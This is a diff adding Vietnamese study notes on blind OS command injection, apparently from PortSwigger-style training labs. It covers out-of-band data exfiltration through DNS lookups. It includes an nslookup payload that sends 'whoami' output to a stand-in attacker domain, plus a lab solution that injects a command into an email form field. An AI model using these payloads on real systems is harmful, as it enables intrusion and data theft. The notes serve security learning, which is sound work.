@@ -171,3 +171,31 @@
 > ```
 >
 > ![img](../asset/os-command-injection-4-Blind-OS-command-injection-with-out-of-band-interaction-0.png) ![img](../asset/os-command-injection-4-Blind-OS-command-injection-with-out-of-band-interaction-1.png)
+
+---
+
+> `out-of-band` cũng cung cấp một cách dễ dàng để lọc đầu ra từ các command đưa vào:
+>
+> ```
+> & nslookup `whoami`.kgji2ohoyw.web-attacker.com &
+> ```
+
+> Điều này sẽ thực hiện tra cứu DNS với miền của attacker chứa kết quả của lệnh `whoami`:
+>
+> ```
+> wwwuser.kgji2ohoyw.web-attacker.com
+> ```
+
+### Lab: Blind OS command injection with out-of-band data exfiltration
+
+> Des: Lab này chứa vul tại feedback. cho phép user thực hiện shell, nhưng không bất đồng bộ và làm ảnh hưởng tới response. Không thể redirect. Tuy nhiên có thể kích hoạt tương tác ngoài băng tần với domain ngoài
+
+> Để solv hãy thực hiện command `whoami` và trích xuất DNS với Burp Collaborator. Nhập tên của user hiện tại
+
+> Bài này chặn submit feedback và sửa field email:
+>
+> ```
+> email=||nslookup+`whoami`.site||
+> ```
+>
+> ![](../asset/os-command-injection-5-Blind-OS-command-injection-with-out-of-band-data-exfiltration-0.png) ![img](../asset/os-command-injection-5-Blind-OS-command-injection-with-out-of-band-data-exfiltration-1.png)
